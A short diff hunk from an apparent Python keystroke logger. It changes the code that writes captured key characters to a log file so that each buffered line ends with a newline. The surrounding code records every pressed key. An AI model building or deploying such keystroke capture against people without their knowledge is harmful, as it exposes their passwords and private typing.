@@ -25,7 +25,7 @@ with open(logpath, "a") as writer:
             global currentline
             key = keyevent.char
             if currentcharcount+len(key) > charsperline:
-                writer.write(currentline)
+                writer.write(currentline+"\n")
                 currentcharcount = 0
                 currentline = ""
 
